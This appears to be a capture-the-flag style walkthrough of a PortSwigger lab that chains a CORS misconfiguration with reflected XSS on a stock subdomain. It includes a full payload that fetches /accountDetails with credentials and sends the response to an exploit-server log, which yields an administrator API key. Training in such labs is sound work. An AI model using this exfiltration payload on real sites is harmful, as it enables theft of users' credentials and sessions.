```javascript

1. Open the lab and login with the credentials
2. Navigate to the Burp HTTP history and look for the request /accountDetails

TEST 1
Origin: null

RESULT 1
Access-Control-Allow-Origin: null  --  Response from the server

TEST 2
Origin: https://0abd00b60450658f827d8d2c007300eb.web-security-academy.net

RESULT 2
The response didn’t reflect our header

TEST 3
Origin: https://admin.0abd00b60450658f827d8d2c007300eb.web-security-academy.net

RESULT 3
Access-Control-Allow-Origin: https://admin.0abd00b60450658f827d8d2c007300eb.web-security-academy.net  --  Response from the server  --  We can request the credentials from any host without restriction

3. Navigate to the home page and click on View details
4. Chick on Check stock
5. Click on the check stock functionality, and you will see a subdomain called ‘stock’ appear
https://stock.0abd00b60450658f827d8d2c007300eb.web-security-academy.net/?productId=1&storeId=1

TEST 4
Test for XSS  --  https://stock.0abd00b60450658f827d8d2c007300eb.web-security-academy.net/?productId=1<script>alert()</script>&storeId=1

RESULT 4
XSS confirmed

PAYLOAD

<script>
  document.location =
    "http://stock.0abd00b60450658f827d8d2c007300eb.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0abd00b60450658f827d8d2c007300eb.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ae800e40421651182fe8c7a01fc00b8.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1";
</script>

3. Go to exploit server and deliver this payload to the victim
4. Open access log and copy the response and Decode as URL

{ "username": "administrator", "email": "", "apikey":
"arXkeACZNybNGPSpaCn1v3cpuCs64oOG", "sessions": [
"ewZj9c9H2rGQxHPEEZYEo1PnmhPP7Ypg" ]}

5. Submit the API key and done

```
